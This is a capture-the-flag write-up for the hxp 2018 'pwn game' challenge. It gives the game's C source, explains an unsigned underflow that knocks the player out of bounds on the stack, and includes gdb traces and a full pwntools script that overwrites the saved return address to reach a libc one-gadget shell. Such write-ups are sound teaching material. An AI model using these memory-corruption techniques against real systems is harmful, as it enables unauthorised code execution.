---
title: "hxp 2018 - Pwning - pwn game"
description: "A monster huntig your in memory"
---

<script>
function render_typescript(name, container, speed) {
    var term = new Terminal();
    term.open(document.getElementById(container));
    $.get( name, function( data ) {
        var i=0;
        function type() {
            if (i == 0) term.reset();
            chunk = ""
            for (; i < data.length; i++) {
                c = data[i];
                chunk += c;
                if (chunk.includes("Oo") || chunk.includes("\n\n")) {i ++; break;}
            }
            term.write(chunk);
            if( i >= data.length-1) {
                clearInterval(timer);
                i = 0;
                setTimeout(function () {
                    timer = setInterval(type ,speed);
                }, 5000);
            }
        }
        var timer = setInterval(type ,speed);
    });
}
</script>

# pwn game

This challenge implements a simple arcade game, a player 'Oo' can be controlled with w,a,s,d in a 10x10 field.
The goal is to set each field to a target to value using +/- (increment, decrement by 1) or 1/2 (increment, decrement by 0x10).
A monster ':O' hunts the player, who has 3 lives.
A long text, in the beginning, tells us, that the goal is to get a shell and not to get a high score.


<button class="collapsible">Show Source</button>
<div class="collapsibleContent" markdown="1">
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>

#define FIELD_WIDTH 10u
#define FIELD_HEIGHT 10u

#define X_MIN 0u
#define X_MAX FIELD_WIDTH - 1u

#define Y_MIN 0u
#define Y_MAX FIELD_HEIGHT - 1u

#define COLOR(X) "\x1B[" X "m"
#define COL_GREEN COLOR("32")
#define COL_RED COLOR("31")
#define COL_DEFAULT COLOR("0")

bool headless = false;

struct enemy {
    uint8_t cooldown;
    uint8_t prev_render_pos_x;
    uint8_t prev_render_pos_y;
    uint8_t pos_x;
    uint8_t pos_y;
    int8_t dx;
    int8_t dy;
};

struct player {
    uint8_t prev_render_pos_x;
    uint8_t prev_render_pos_y;
    uint8_t pos_x;
    uint8_t pos_y;
    uint64_t score;
    uint8_t lifes;
    int8_t dx;
    int8_t dy;
};

#define clear() printf(COL_DEFAULT "\033[H\033[J")
// move the cursor to the given position
#define gotoxy(x,y) printf("\033[%d;%dH", (y), (x))

#define goto_pos_xy(x, y) gotoxy(3*x+2u, y+2u);

#define HEART "o"
#define LU_CORNER "\xe2\x95\x94"
#define RU_CORNER "\xe2\x95\x97"
#define LL_CORNER "\xe2\x95\x9a"
#define RL_CORNER "\xe2\x95\x9d"
#define H_BOX "\xe2\x95\x90"
#define V_BOX "\xe2\x95\x91"
#define PLAYER COLOR("0") COLOR("7") "Oo"
#define ENEMY COLOR("91") COLOR("7") ":O" //"\xf0\x9f\x91\xbf"

#define csize(X) (sizeof(X) - 1u)

char wait_key()
{
    puts("\nPRESS ANY KEY TO CONTINUE; <q>: QUIT; <h>: TOGGLE HEADLESS...");
    char c = getchar();
    if (c == 'q')
        exit(0);
    else if (c == 'h')
        headless = !headless;
    return c;
}

void draw_enemy(struct enemy* e)
{
    e->prev_render_pos_x = e->pos_x;
    e->prev_render_pos_y = e->pos_y;
    goto_pos_xy(e->pos_x, e->pos_y);
    fwrite(ENEMY, 1, csize(ENEMY), stdout);
}

void draw_player(struct player* p)
{
    p->prev_render_pos_x = p->pos_x;
    p->prev_render_pos_y = p->pos_y;
    goto_pos_xy(p->pos_x, p->pos_y);
    fwrite(PLAYER, 1, csize(PLAYER), stdout);
    goto_pos_xy(p->pos_x, p->pos_y);
}

void draw_meta(struct player* p, struct enemy* e, char* realfield, char* targetfield)
{
    fwrite("Lifes: " COL_RED HEART HEART HEART, 1, csize("lifes: " COL_RED) + (csize(HEART)) * (p->lifes), stdout);
    fwrite("     ", 1, 5 - (p->lifes), stdout);
    printf(COL_DEFAULT "    Score: %lu     Position: (%u, %u)", p->score, p->pos_x, p->pos_y);
    uint16_t pos = p->pos_y * FIELD_WIDTH + p->pos_x;
    printf("\nCURRENT CELL: ");
    if(realfield[pos] == targetfield[pos])
        fwrite(COL_GREEN, csize(COL_GREEN), 1u, stdout);
    else
        fwrite(COL_RED, csize(COL_RED), 1u, stdout);
    printf("%02hhx -> %02hhx\n", realfield[pos], targetfield[pos]);
    fwrite(COL_DEFAULT, csize(COL_DEFAULT), 1u, stdout);
    puts("================== CONTROLS: ===================\n"
        "<w/a/s/d>: MOVE         <q>: QUIT\n"
        "<+/->: INC/DEC 1        <1/2>: INC/DEC 0x10\n"
        "<r>: SHOW REAL FIELD    <t>: SHOW TARGET FIELD\n"
        "<h>: TOGGLE HEADLESS    <f>: RENDER SINGLE IMAGE\n");

}

void render_field(char* field, char* targetfield, char* renderfield)
{
    uint8_t y = 0u;
    uint8_t x = 0u;
    clear();

    // draw the upper border
    fwrite(LU_CORNER, csize(LU_CORNER), 1u, stdout);
    for(x=0u; x < FIELD_WIDTH; x++)
        fwrite(H_BOX H_BOX H_BOX, 3*csize(H_BOX), 1u, stdout);
    fwrite(RU_CORNER "\n", csize(RU_CORNER "\n"), 1u, stdout);

    // draw the actual field
    for(y=0u; y < FIELD_HEIGHT; y++)
    {
        fwrite(V_BOX, csize(V_BOX), 1u, stdout);
        for(x=0u; x < FIELD_WIDTH; x++)
        {
            // make the field green, if it is correct, otherwise make it red
            uint16_t idx = y * FIELD_WIDTH + x;
            if(field[idx] == targetfield[idx])
                fwrite(COL_GREEN, csize(COL_GREEN), 1u, stdout);
            else
                fwrite(COL_RED, csize(COL_RED), 1u, stdout);
            printf("%02x ", renderfield[idx] & 0xff);
        }
        printf(COL_DEFAULT);
        fwrite(V_BOX "\n", csize(V_BOX "\n"), 1u, stdout);
    }

    // draw the lower border
    fwrite(LL_CORNER, csize(LL_CORNER), 1u, stdout);
    for(x=0u; x < FIELD_WIDTH; x++)
        fwrite(H_BOX H_BOX H_BOX, 3*csize(H_BOX), 1u, stdout);
    fwrite(RL_CORNER "\n", csize(RL_CORNER "\n"), 1u, stdout);
}

void render_all(struct enemy* e, struct player* p, char* field, char* targetfield, char* renderfield)
{
    render_field(field, targetfield, renderfield);
    draw_meta(p, e, field, targetfield);
    draw_enemy(e);
    draw_player(p);
}

void render_differential(struct enemy* e, struct player* p, char* field, char* targetfield, char* renderfield)
{
    uint8_t x, y;
    fwrite(COL_DEFAULT, csize(COL_DEFAULT), 1u, stdout);
    x = p->prev_render_pos_x;
    y = p->prev_render_pos_y;
    if((x != p->pos_x) || (y != p->pos_y))
    {
        goto_pos_xy(x, y);
        uint16_t idx = y * FIELD_WIDTH + x;
        if(field[idx] == targetfield[idx])
            fwrite(COL_GREEN, csize(COL_GREEN), 1u, stdout);
        else
            fwrite(COL_RED, csize(COL_RED), 1u, stdout);
        printf("%02x ", renderfield[idx] & 0xff);
    }

    x = e->prev_render_pos_x;
    y = e->prev_render_pos_y;
    if((x != e->pos_x) || (y != e->pos_y))
    {
        goto_pos_xy(x, y);
        uint16_t idx = y * FIELD_WIDTH + x;
        if(field[idx] == targetfield[idx])
            fwrite(COL_GREEN, csize(COL_GREEN), 1u, stdout);
        else
            fwrite(COL_RED, csize(COL_RED), 1u, stdout);
        printf("%02x ", renderfield[idx] & 0xff);
    }

    gotoxy(0, FIELD_HEIGHT + 3);
    fwrite(COL_DEFAULT, csize(COL_DEFAULT), 1u, stdout);
    draw_meta(p, e, field, targetfield);
    draw_enemy(e);
    draw_player(p);
}

void move_enemy(struct enemy* e, struct player* p)
{
    // enemy will always make three steps and then pause for three steps
    if(e->cooldown < 3u)
    {
        // move towards player
        e->dx = p->pos_x - e->pos_x;
        e->dy = p->pos_y - e->pos_y;
        if(e->dx > 0)
            e->pos_x++;
        else if(e->dx < 0)
            e->pos_x--;
        if(e->dy > 0)
            e->pos_y++;
        else if(e->dy < 0)
            e->pos_y--;
    }
    if(e->cooldown == 0u)
    {
        e->dx = 0;
        e->dy = 0;
        e->cooldown = 6u;
    }
    e->cooldown--;
}

void damage_and_knock_back(struct enemy* e, struct player* p)
{
    if((e->pos_x == p->pos_x) && (e->pos_y == p->pos_y))
    {
        p->lifes--;
        if(e->dx > 0 && p->pos_x + 1 < X_MAX)
            p->pos_x++;
        else if(e->dx < 0 && p->pos_x - 1 >= X_MIN)
            p->pos_x--;
        if(e->dy > 0 && p->pos_y + 1 < Y_MAX)
            p->pos_y++;
        else if(e->dy < 0 && p->pos_y - 1 >= Y_MIN)
            p->pos_y--;
    }
}

void init_player(struct player* p)
{
    p->pos_x = 0u;
    p->pos_y = 0u;
    p->score = 500u;
    p->lifes = 3u;
}

void init_enemy(struct enemy* e)
{
    e->cooldown = 5u;
    e->pos_x = 0u;
    e->pos_y = 0u;
    e->dx = 0u;
    e->dy = 0u;
}

void modify_field(int8_t diff, struct player* p, char* field, char* targetfield, uint16_t idx)
{
    if(field[idx] == targetfield[idx])
    {
        // U STOOPID????
        if (p->score < 500u)
            p->score = 0u;
        else
            p->score -= 500u;
    }

    field[idx] += diff;

    if(field[idx] == targetfield[idx])
        p->score += 100;
}

bool action(char input, struct enemy* e, struct player* p, char* field, char* targetfield, char** renderfield)
{
    bool moved = false;
    p->dx = 0;
    p->dy = 0;
    uint16_t idx = p->pos_y * FIELD_WIDTH + p->pos_x;
    switch(input)
    {
        case 'w': 
            if(p->pos_y >= Y_MIN + 1)
                p->dy = -1;
            moved = true;
            break;
        case 's':
            if(p->pos_y <= Y_MAX - 1)
                p->dy = 1;
            moved = true;
            break;
        case 'a':
            if(p->pos_x >= X_MIN + 1)
                p->dx = -1;
            moved = true;
            break;
        case 'd':
            if(p->pos_x <= X_MAX - 1)
                p->dx = 1;
            moved = true;
            break;
        case '+':
            modify_field(1, p, field, targetfield, idx);
            moved = true;
            break;
        case '-':
            modify_field(-1, p, field, targetfield, idx);
            moved = true;
            break;
        case '1':
            modify_field(0x10, p, field, targetfield, idx);
            moved = true;
            break;
        case '2':
            modify_field(-0x10, p, field, targetfield, idx);
            moved = true;
            break;
        case 't':
            *renderfield = targetfield;
            break;
        case 'r':
            *renderfield = field;
            break;
        case 'f':
            render_all(e, p, field, targetfield, *renderfield);
            break;
        case 'h':
            headless = !headless;
            if(!headless)
                render_all(e, p, field, targetfield, *renderfield);
            break;
        default:
            break;
    }
    p->pos_x += p->dx;
    p->pos_y += p->dy;
    return moved;
}

void generate_field(char* field, uint16_t level)
{
    for(uint8_t x = 0; x < FIELD_WIDTH; x++)
    {
        for(uint8_t y = 0; y < FIELD_HEIGHT; y++)
        {
            field[y * FIELD_WIDTH + x] = 0x50u + (rand() % (level * 5u));
        }
    }
}

char* main_loop(char* score_buf)
{
    srand(0);
    uint16_t level = 1;
    char field[FIELD_WIDTH * FIELD_HEIGHT];
    char targetfield[FIELD_WIDTH * FIELD_HEIGHT];
    generate_field(field, level);
    generate_field(targetfield, level);
    struct player p;
    init_player(&p);
    struct enemy e;
    init_enemy(&e);
    p.pos_x = FIELD_WIDTH / 2u;
    p.pos_y = FIELD_HEIGHT / 2u;
    char* renderfield = field;
    if(!headless)
        render_all(&e, &p, field, targetfield, renderfield);
    while((p.lifes > 0u))
    {
        char input;
        fread(&input, 1u, 1u, stdin);
        if(input == 'q')
        {
            puts("EXITING");
            break;
        }
        if(action(input, &e, &p, field, targetfield, &renderfield))
        {
            if(!memcmp(field, targetfield, FIELD_WIDTH * FIELD_HEIGHT))
            {
                clear();
                puts("NO ONE EVER CAME THIS FAR! WHAT DO WE DO NOW???\n"
                    "LET'S JUST THROW ANOTHER LEVEL AT YOU...\n");
                p.score += 2000;
                wait_key();
                level++;
                generate_field(targetfield, level);
            }
            if(p.score > 1)
                p.score--;
            move_enemy(&e, &p);
            damage_and_knock_back(&e, &p);
        }
        if(!headless)
            render_differential(&e, &p, field, targetfield, renderfield);
    }
    snprintf(score_buf, 256u, "GAME OVER, YOUR SCORE: %lu!\nPRESS ENTER TO EXIT!\n", p.score);
    return score_buf;
}

void show_tutorial()
{
    clear();
    puts("============ TUTORIAL ============\n"
         "First of all...\n"
         "If you are playing remotely, you should start this game using \n\n"
         "stty -icanon min 1 time 0 && nc <IP> <PORT>\n\n"
         "If you haven't done so, netcat will buffer your input and you will be missing\n"
         "out on all the fun, so you should consider restarting the game (press <q> to quit).\n"
         "You can also press <s> to skip the Tutorial.\n"
         "You can press <h> any time in order to turn headless mode on or off.\n"
         "In headless mode the field is not rendered unless you press <f>, which can be used for reducing the network traffic.\n"
         );
    if(wait_key() == 's' || headless)
        return;
    puts("In this game you are given a target field consisting of multiple cells which you need to recreate.\n"
         "Press <t> to show your target field and <r> to show the real field.\n"
         "Use <w>, <a>, <s>, <d> to move through the field and <+> and <-> to increment or decrement the field you are currently standing on (values are given in hex).\n"
         "You can also increment and decrement in steps of 0x10 by using the keys <1> and <2>\n"
         "Once the target and the real field are equal, you beat the level.\n");
    if(wait_key() == 's' || headless)
        return;
    puts("This is a monster: " ENEMY COL_DEFAULT);
    puts("Do not get eaten by the monster! We are legally required to tell you that we will not cover for your doctor's bill if you get (partially) eaten by the monster!\n");
    if(wait_key() == 's' || headless)
        return;
    puts("Actually we probably aren't required to tell you that but we do so anyway...\n");
    if(wait_key() == 's' || headless)
        return;
    puts("You won't get a flag for making a new highscore (you'll get it if you pwn the game) but if you can make it, you will receive great glory and you will always be remembered!\n");
    if(wait_key() == 's' || headless)
        return;
    puts("Actually no... you won't be remembered, since we did not implement a highscore-list, so you are playing just for fun! ;)\n");
    puts("Are you ready?");
    if(wait_key() == 's' || headless)
        return;
}

int main(int argc, char** argv)
{
    char score_buf[2048]; // I LIKE BIG BUFFERS AND I CANNOT LIE!

    // Make sure keypresses are not echoed and are sent immediately
    // Does not affect remote, though
    static struct termios oldt, newt;
    tcgetattr(STDIN_FILENO, &oldt);
    newt = oldt;
    newt.c_lflag &= ~(ICANON);
    newt.c_lflag &= ~(ECHO);
    tcsetattr(STDIN_FILENO, TCSANOW, &newt);

    setvbuf(stdout, NULL, _IONBF, 0u);
    setvbuf(stdin, NULL, _IONBF, 0u);

    show_tutorial();

    char* end_text = main_loop(score_buf);
    char c;
    do {
        clear();
        fwrite(end_text, sizeof(char), strlen(end_text), stdout);
    } while((c = getchar()) != '\n' && c != 'q');

    // Reset terminal mode
    tcsetattr(STDIN_FILENO, TCSANOW, &oldt);
    return 0u;
}
```
</div>

The only possibility to corrupt memory is `char field[FIELD_WIDTH * FIELD_HEIGHT]`, which is used to store the game field.
Even though, there are appears to be propper bound checks for the player movement.

# Bug description

The bug happens in the `damage_and_knock_back()` function, which is executed, if the monster gets the player.

```
struct player {
    [...]
    uint8_t pos_y;
    [...]
};
[...]
    else if(e->dy < 0 && p->pos_y - 1 >= Y_MIN)
                p->pos_y--;
[...]
```

The player position `p->pos_y` is stored as an `unsigned char`.
Therefore if the players `y` position is 0, `p->pos_y-1 = 255` and the check evaluets to true.
So the knockback will push us out of bounds and set the players `y` position to 255.
It is also possible to break out in `x` direction, but this gives us limited memory access (details see later).

To trigger the bug, we have to get in the upper left corner with the monster directly below us, so it moves up (`e->dy = -1`).
As the monster movement is deterministic, we can generate a sequence of moves manually and replay it as needed.
One example to get out of bounds is the following combination of moves:

```
ssddadsdwwwwwwwaawasssssssssssaawwaaawwwwwwwwwwwwwww
```

If we send this sequence to the game we suddenly end up in `(0,255)`.
Using +,-,1,2 we can now edit random bytes in the memory.

<div id="terminal-outofbounds"></div>
<script>render_typescript("outofbounds.typescript","terminal-outofbounds",30);  </script>

# Rip Control

Our goal would be to jump to the magic gadget in libc, to execute a shell.
Even though we can use any return address, it is easier to use `__libc_start_main` which already points to libc.
Therefore, we only have to change a small offset.


```
gdb-peda$ b render_field
[...]
gdb-peda$ p $rdi
$1 = 0x7fffffffd2c0 #address of field[]
gdb-peda$ bt
#0  0x0000555555555551 in render_field ()
#1  0x00005555555557c9 in render_all ()
#2  0x0000555555556198 in main_loop ()
#3  0x00005555555565e0 in main ()
#4  0x00007ffff7dc5223 in __libc_start_main () from /usr/lib/libc.so.6
#5  0x000055555555514e in _start ()
gdb-peda$ info frame 3
Stack frame at 0x7fffffffdc00:
 rip = 0x5555555565e0 in main; saved rip = 0x7ffff7dc5223
 [...]
 rbx at 0x7fffffffdbe8, rbp at 0x7fffffffdbf0, rip at 0x7fffffffdbf8
```

The field is stored on stack at `0x7fffffffd2c0` and our target return address is at `0x7fffffffdbf8` so we need to write at offset `2360`.
The index is computed as `idx = y * FIELD_WIDTH + x` so our return address is stored from `(0,236)` to `(7,236)`.
After getting out of bounds, we can try to overwrite that address.
For a simple proof of concept, we can now try to overwrite the upper two bytes with some value to trigger a SIGSEGV.
This can be done using the following sequence.


```
ssddadsdwwwwwwwaawasssssssssssaawwaaawwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwwdddddd+1d+1q
```

Indeed, after an exit the game crashes at `0x11117ffff7dc5223`, therefore our theory seems to be correct.

<div id="terminal-segv"></div>
<script>render_typescript("segv.typescript","terminal-segv",30);  </script>

# Looping

As the monster has no bound checks, it will hunt us in memory.
Due to the bound checks of the player, we can only navigate to a smaller `y` position and therefore we can't escape the monster.
This limits us to approx 17 moves, what wasn't enough to jump to the magic gadget.
One trick to circumvent tihs issue is to overwrite the return address in `main_loop` in the following way, to reset the game:


```
   0x00005555555565cc <+284>:   call   0x55555555637b <show_tutorial>     <= overwritten rip
   0x00005555555565d1 <+289>:   lea    rax,[rbp-0x820]
   0x00005555555565d8 <+296>:   mov    rdi,rax
   0x00005555555565db <+299>:   call   0x5555555560c0 <main_loop>
   0x00005555555565e0 <+304>:   mov    QWORD PTR [rbp-0x828],rax          <= saved rip
```

Similar to the previous step, we can compute the player position, required to overwrite the LSB of the return address, what happens to be `(2,23)`.
By decrementing the return address by 20, we can reset the game and have another try.
This is done each time, after modifying one nibble of the return address to `__libc__start_main`.

# Exploit

By looking at the given libc, our saved return address should be `libc+0x202e1` and one possible gadget would be `libc+0x3f306`.
Therefore, we have to change the nibbles in the following way:

```
0x202e1
0x3f306
      ^+5  +++++
     ^ -14 22222222222222
    ^  +1  d+
   ^   +15 d111111111111111
  ^    +1  dd+
```

The actions are chosen, so that no carry bit is created for the lower nibble.
Even though this approach was working locally it did not spawn a shell on the server.
The reason was, that the libc offset might create carry bits, that we have to take into account.
Therefore first we had to leak saved `rip` and calculate the actual difference.
The overall strategy is unchanged.

<div id="terminal-exploit"></div>
<script>render_typescript("exploit.typescript","terminal-exploit",30);  </script>

```python
import pwn
import sys
import re

#game_sequences
out_of_bounds = "ssddadsdwwwwwwwaawasssssssssssaawwaaawwwwwwwwwwwwwww"
jump_libc_ret = "w"*(255-236)
loop = "d"*9 + "w"*(236-23) + "a"*7 + "-"*20 + "q"

#leak saved_rip return address
def leak_and_loop(r):
    r.recvuntil("============ TUTORIAL ============")
    for i in xrange(6):
        r.sendline("")
    r.recvuntil("RENDER SINGLE IMAGE")

    #jump to byte
    for c in out_of_bounds + jump_libc_ret:
        r.send(c)
        data = r.recvuntil("CONTROLS:")

    #leak return address
    leak = 0
    for i in xrange(8):
        leak |= int(re.findall("[0-9a-f]+ -> [0-9a-f]+", data.replace("\n", ""))[0][:2], 16) << (8*i)
        r.send("d")
        data = r.recvuntil("CONTROLS:")
    print "leak: 0x%x" % leak

    r.send(loop)

    return leak

#move to __libc_start_main return address, write byte and loop
def write_and_loop(r, value):
    r.recvuntil("============ TUTORIAL ============")
    for i in xrange(6):
        r.sendline("")
    r.recvuntil("RENDER SINGLE IMAGE")

    sequence = out_of_bounds + jump_libc_ret + value + loop
    r.send(sequence)
    print sequence


#local
ret_libc_start_main = 0x24223
r = pwn.process("./challenge")
#pwn.gdb.attach(r)

#remote
#ret_libc_start_main = 0x202e1
#r = pwn.remote("195.201.127.177", 9999)

#leak and compute target rip
saved_rip = leak_and_loop(r)
magic_gadget = int(sys.argv[1], 16) + saved_rip - ret_libc_start_main
print "magic_gadget: 0x%x" % magic_gadget

#write target rip
byte_offset = ""
while magic_gadget != saved_rip:
    #write lower nibble
    n = (magic_gadget&0xf) - (saved_rip&0xf)
    print n, magic_gadget&0xf, saved_rip&0xf
    if n > 0:
        write_and_loop(r, byte_offset + "+"*n)
    elif n < 0:
        write_and_loop(r, byte_offset + "-"*-n)
    magic_gadget = magic_gadget >> 4
    saved_rip = saved_rip >> 4

    #write upper nibble
    n = (magic_gadget&0xf) - (saved_rip&0xf)
    print n, magic_gadget&0xf, saved_rip&0xf
    if n > 0:
        write_and_loop(r, byte_offset + "1"*n)
    elif n < 0:
        write_and_loop(r, byte_offset + "2"*-n)
    saved_rip = saved_rip >> 4
    magic_gadget = magic_gadget >> 4
    byte_offset += "d"

# exit the game
r.recvuntil("============ TUTORIAL ============")
for i in xrange(6):
    r.sendline("")
r.sendline("q")
r.recvuntil("PRESS ENTER TO EXIT!")
r.sendline("")

r.interactive()
```

# Files
- [Exploit](exploit.py)
- [Challenge.tar.xz](pwn game-fd561b730951afff.tar.xz)
